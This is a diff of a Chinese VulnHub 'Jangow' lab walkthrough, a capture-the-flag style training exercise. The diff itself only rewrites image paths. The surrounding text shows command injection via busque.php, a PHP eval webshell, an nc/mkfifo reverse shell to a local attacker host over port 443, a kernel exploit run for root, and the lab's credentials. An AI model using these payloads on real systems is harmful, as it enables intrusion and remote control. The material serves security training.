@@ -16,23 +16,23 @@
 
 也可以使用`nmap`等工具进行
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\1.jpg)
+![](./pic/1.jpg)
 
 # 信息收集
 
 ## 使用nmap扫描端口
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\2.jpg)
+![](./pic/2.jpg)
 
 ## 网站信息探测
 
 访问80端口网站，发现有目录`site`，点击后，出现界面，这个界面真挺好看的
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\3.jpg)
+![](./pic/3.jpg)
 
 查看页面源代码，发现一个`php`界面，并且参数都有了
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\4.jpg)
+![](./pic/4.jpg)
 
 使用多款目录爆破工具，使用`dirsearch`，默认字典，发现隐藏文件，当然这里也可以设置其递归爆破，只是这样速度可能会稍慢
 
@@ -40,21 +40,21 @@
 dirsearch -u http://192.168.10.9 -x 403,404 -e js
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\5.jpg)
+![](./pic/5.jpg)
 
 使用`girb`进行扫描，默认字典，发现`wordpress`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\6.jpg)
+![](./pic/6.jpg)
 
 打开隐藏文件`/backup`，发现连接数据库的相关信息
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\7.jpg)
+![](./pic/7.jpg)
 
 用户名`jangow01`，密码`abygurl69`
 
 尝试打开`wordpress`，发现并非`cms`，只是目录名称为这个，其内容就是`site`中的默认界面内容
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\8.jpg)
+![](./pic/8.jpg)
 
 # 漏洞利用
 
@@ -67,7 +67,7 @@ ffuf -c -w /usr/share/wordlists/wfuzz/Injections/All_attack.txt -u http://192.16
 #-fs 1 是把原本界面大小1，直接过滤掉
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\9.jpg)
+![](./pic/9.jpg)
 
 ```shell
 http://192.168.10.9/site/busque.php?buscar=%0a/bin/cat%20/etc/passwd
@@ -75,7 +75,7 @@ http://192.168.10.9/site/busque.php?buscar=%0a/bin/cat%20/etc/passwd
 
 复制这个语句，通过浏览器访问，发现一个用户，也就是前面隐藏文件中的用户名`jangow01`和密码`abygurl69`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\10.jpg)
+![](./pic/10.jpg)
 
 而且，可以看到这里是通过调用`cat`来查看的，是否表示这里可以进行命令执行，直接更换为`ls`，测试发现，成了！
 
@@ -83,19 +83,19 @@ http://192.168.10.9/site/busque.php?buscar=%0a/bin/cat%20/etc/passwd
 http://192.168.10.9/site/busque.php?buscar=%0a/bin/ls
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\11.jpg)
+![](./pic/11.jpg)
 
 查看后，发现其代码调用`system`函数
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\12.jpg)
+![](./pic/12.jpg)
 
 这里虽然可以进行很多，不过既然给出了`ftp`，总要用一下，以上面获取的用户名和密码进行登录，如果存在这样的情况。用户名`jangow01`，密码`abygurl69`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\13.jpg)
+![](./pic/13.jpg)
 
 发现这就是网站的一些文件，可以从这里查看，前面的都差不多发现了，在`wordpress`处发现一个`config.php`文件，是连接数据库的
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\14.jpg)
+![](./pic/14.jpg)
 
 用户名`desafio02`和密码`abygurl69`，这里打算再以这个凭证登录的，发现失败
 
@@ -103,9 +103,9 @@ http://192.168.10.9/site/busque.php?buscar=%0a/bin/ls
 
 那么回到网站上，尝试通过`php`文件获取一个反弹`shell`，不过在构造多条语句无果后，我测试了一下网络连通，发现`kali`可以连通靶机，但是反过来不行，导致流量无法出来。可能是这个`php`文件中还有其他的限制等情况
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\15.jpg)
+![](./pic/15.jpg)
 
-![16](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\16.jpg)
+![16](./pic/16.jpg)
 
 这个流量没出去，不过既然命令可执行，就尝试在本地直接写一个`php`文件，然后再测试
 
@@ -123,17 +123,17 @@ http://192.168.10.9/site/busque.php?buscar=%0a/bin/ls
 busque.php?buscar=echo '<?php @eval($_GET['cmd']);?>' > shell.php
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\17.jpg)
+![](./pic/17.jpg)
 
 ## webshell
 
 尝试使用蚁剑等工具进行连接，发现成功，说明可以连接，只是进行端口限制，至于是哪个端口，需要进一步验证
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\18.jpg)
+![](./pic/18.jpg)
 
 也就是这里不仅是端口，还有函数也进行了限制，现在连接蚁剑的虚拟终端，查看`flag`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\19.jpg)
+![](./pic/19.jpg)
 
 测试使用`nc`进行反弹，发现`-e`参数无法使用，并且还是端口问题，无法发出流量
 
@@ -149,7 +149,7 @@ nc -zv -w20 192.168.10.2 21 22 23 25 53 80 110 111 135 139 143 443 445 3389 8080
 
 执行后，查看`result`，发现有一个端口可能存在连接，因为这里明确说明是拒绝连接，至少说明有流量产生
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\20.jpg)
+![](./pic/20.jpg)
 
 尝试测试这个端口能否把流量发送到`kali`，也就是测试能否通过这个端口进行通信
 
@@ -157,7 +157,7 @@ nc -zv -w20 192.168.10.2 21 22 23 25 53 80 110 111 135 139 143 443 445 3389 8080
 
 测试，确定在`443`端口是可以的，其他端口使用`wget`都是无法通信的状态
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\21.jpg)
+![](./pic/21.jpg)
 
 那么也就是，在靶机内，只要请求的外部资源是`443`端口的，就可以产生通信，也就是外部返回必须是`443`端口。
 
@@ -175,7 +175,7 @@ nc -zv -w20 192.168.10.2 21 22 23 25 53 80 110 111 135 139 143 443 445 3389 8080
 
 这时候，再通过浏览器访问这个脚本，以触发，即可反弹
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\22.jpg)
+![](./pic/22.jpg)
 
 或者在之前默认的命令执行处，把上面的反弹`shell`代码进行一个编码处理，然后通过浏览器传参执行，也是可以的
 
@@ -186,37 +186,37 @@ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.10.2 443 >/tmp/f
 rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fbash%20-i%202%3E%261%7Cnc%20192.168.10.2%20443%20%3E%2Ftmp%2Ff
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\23.jpg)
+![](./pic/23.jpg)
 
 # 提权
 
 获取到第一个`flag`
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\24.jpg)
+![](./pic/24.jpg)
 
 
 
 使用`find`寻找具有SUID权限文件，发现`sudo`，测试发现并不可用
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\25.jpg)
+![](./pic/25.jpg)
 
 查看靶机内用户，发现和之前查看`/etc/passwd`一样，只要`jangow01`，使用`su`切换后，使用上面的密码`abygurl69`，登录成功，不过就是执行`sudo`还是无权，寻找其他方式
 
 查看操作系统信息及内核
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\26.jpg)
+![](./pic/26.jpg)
 
 使用`searchsploit`搜索有无内核漏洞，发现几个，不过经过测试，可用的只有这个
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\27.jpg)
+![](./pic/27.jpg)
 
 查看该文件，其中有用法，以及测试主机
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\28.jpg)
+![](./pic/28.jpg)
 
 在靶机中使用`gcc -v`发现可以使用`gcc`命令，那么通过端口复用，把文件下载到靶机，也就是443端口复用，其余端口进行限制，不过这里还没权限知道规则
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\29.jpg)
+![](./pic/29.jpg)
 
 编译文件后，给予执行权限，然后直接运行
 
@@ -226,15 +226,15 @@ chmod +x exp
 ./exp
 ```
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\30.jpg)
+![](./pic/30.jpg)
 
 切换`/root`目录，查看最后的文件
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\31.jpg)
+![](./pic/31.jpg)
 
 使用`iptables -L`简单看一下拦截情况
 
-![](D:\stu\vulnhub\OSCP必刷靶场\jangow靶场\pic\32.jpg)
+![](./pic/32.jpg)
 
 # 总结
 
